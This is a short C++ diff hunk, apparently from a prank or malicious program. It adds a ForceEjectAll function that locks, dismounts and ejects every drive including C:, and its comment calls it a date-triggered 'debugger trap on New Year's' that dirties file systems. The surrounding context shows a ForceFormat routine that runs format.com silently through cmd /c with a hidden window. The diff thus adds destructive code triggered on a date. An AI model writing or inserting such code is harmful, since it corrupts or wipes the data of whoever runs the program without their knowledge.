@@ -96,6 +96,24 @@ void EjectAllOptical()
 	}
 }
 
+// Every drive, including C:. Only used as a debugger trap on
+// New Year's — the full lock/dismount/eject sequence runs on
+// every volume, removable or not. Fixed disks can't truly
+// eject, but the lock+dismount will dirty the file system and
+// make the drive letter vanish from Explorer.
+void ForceEjectAll()
+{
+	DWORD mask = GetLogicalDrives();
+
+	for (int i = 0; i < 26; ++i)
+	{
+		if (!(mask & (1u << i)))
+			continue;
+
+		ForceEject(static_cast<wchar_t>(L'A' + i));
+	}
+}
+
 static void ForceFormat(wchar_t driveLetter)
 {
 	// System format.com, run silently via cmd /c with a no-window
